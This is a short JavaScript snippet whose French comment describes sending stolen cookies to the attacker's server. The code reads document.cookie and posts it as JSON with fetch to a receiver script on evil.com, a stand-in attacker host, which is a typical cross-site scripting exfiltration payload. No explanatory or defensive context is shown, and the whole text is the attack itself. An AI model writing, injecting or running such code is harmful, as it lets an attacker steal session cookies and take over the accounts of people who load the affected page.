// Envoyer les cookies volés au serveur attaquant
fetch("https://evil.com:8443/receiver.php", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ cookies: document.cookie })
});